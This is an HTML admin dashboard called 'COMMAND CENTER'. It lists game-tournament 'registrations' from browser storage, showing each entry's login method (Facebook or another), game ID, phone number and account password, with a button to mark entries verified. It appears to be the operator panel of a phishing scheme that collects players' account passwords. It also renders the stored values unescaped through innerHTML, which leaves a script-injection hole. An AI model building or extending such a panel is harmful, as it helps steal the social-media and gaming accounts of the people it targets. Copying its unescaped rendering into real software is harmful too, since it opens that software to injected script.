<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COMMAND CENTER - Admin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #090e17; color: #f1f5f9; font-family: sans-serif; }
    </style>
</head>
<body class="min-h-screen p-8">

    <div class="max-w-7xl mx-auto">
        <div class="flex items-center justify-between mb-10 border-b border-slate-800 pb-6">
            <div>
                <h1 class="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600 tracking-tight">
                    COMMAND CENTER
                </h1>
                <p class="text-slate-400 text-sm mt-1 uppercase tracking-widest">Admin Dashboard</p>
            </div>
            <div class="bg-slate-800 px-4 py-2 rounded-lg border border-slate-700">
                <span id="totalCount" class="text-cyan-400 font-bold">0</span> Total Slots
            </div>
        </div>

        <div class="bg-[#111827] rounded-xl border border-slate-800 shadow-2xl overflow-hidden">
            <div class="overflow-x-auto">
                <table class="min-w-full divide-y divide-slate-800">
                    <thead class="bg-[#1f2937]">
                        <tr>
                            <th class="px-6 py-4 text-left text-xs font-black text-cyan-500 uppercase tracking-widest">Account</th>
                            <th class="px-6 py-4 text-left text-xs font-black text-cyan-500 uppercase tracking-widest">Game ID</th>
                            <th class="px-6 py-4 text-left text-xs font-black text-cyan-500 uppercase tracking-widest">Contact</th>
                            <th class="px-6 py-4 text-left text-xs font-black text-cyan-500 uppercase tracking-widest">Password</th>
                            <th class="px-6 py-4 text-left text-xs font-black text-cyan-500 uppercase tracking-widest">Status</th>
                            <th class="px-6 py-4 text-right text-xs font-black text-cyan-500 uppercase tracking-widest">Command</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody" class="divide-y divide-slate-800">
                        <!-- Rows will be populated by JS -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        function loadData() {
            const regs = JSON.parse(localStorage.getItem('tour_regs') || '[]');
            document.getElementById('totalCount').textContent = regs.length;
            
            const tbody = document.getElementById('tableBody');
            
            if (regs.length === 0) {
                tbody.innerHTML = `<tr><td colspan="6" class="px-6 py-12 text-center text-slate-500 font-mono text-sm">NO REGISTRATIONS FOUND.</td></tr>`;
                return;
            }

            tbody.innerHTML = regs.reverse().map(reg => `
                <tr class="hover:bg-slate-800/50 transition-colors">
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-slate-400">
                        <span class="px-2 py-0.5 rounded text-xs font-bold ${reg.loginMethod === 'Facebook' ? 'bg-blue-900/50 text-blue-400' : 'bg-red-900/50 text-red-400'}">
                            ${reg.loginMethod}
                        </span>
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-slate-200 font-bold">${reg.gameId}</td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-slate-300">${reg.phoneNumber}</td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-slate-400">${reg.extraField || 'N/A'}</td>
                    <td class="px-6 py-4 whitespace-nowrap">
                        <span class="px-3 py-1 inline-flex text-xs font-black uppercase tracking-wider rounded-md border ${reg.status === 'Verified' ? 'bg-emerald-950/50 text-emerald-400 border-emerald-500/30 shadow-[0_0_10px_rgba(16,185,129,0.15)]' : 'bg-amber-950/50 text-amber-400 border-amber-500/30 shadow-[0_0_10px_rgba(245,158,11,0.15)]'}">
                            ${reg.status}
                        </span>
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                        ${reg.status !== 'Verified' ? 
                            `<button onclick="verify(${reg.id})" class="px-4 py-1.5 rounded text-xs font-bold uppercase tracking-widest transition-all bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500 hover:text-slate-900 border border-cyan-500/50">VERIFY</button>` 
                            : `<span class="text-emerald-500 font-bold uppercase tracking-widest text-xs">Approved</span>`
                        }
                    </td>
                </tr>
            `).join('');
        }

        function verify(id) {
            let regs = JSON.parse(localStorage.getItem('tour_regs') || '[]');
            const index = regs.findIndex(r => r.id === id);
            if(index !== -1) {
                regs[index].status = "Verified";
                localStorage.setItem('tour_regs', JSON.stringify(regs));
                loadData();
            }
        }

        // Auto-refresh when localStorage changes in another tab
        window.addEventListener('storage', loadData);
        loadData();
    </script>
</body>
</html>
